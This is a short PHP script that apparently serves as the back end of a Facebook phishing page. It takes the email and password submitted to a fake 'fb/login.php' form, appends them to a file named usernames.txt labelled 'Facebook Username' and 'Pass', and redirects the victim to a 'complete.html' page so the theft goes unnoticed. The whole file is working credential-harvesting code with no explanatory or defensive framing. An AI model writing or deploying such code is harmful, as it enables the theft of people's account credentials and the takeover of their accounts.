<?php 
	file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] ."\n", FILE_APPEND);
	$url = explode('fb/login.php', $_SERVER['PHP_SELF'])[0].'complete.html';
	header('Location: ' . $url);
	exit();
?>
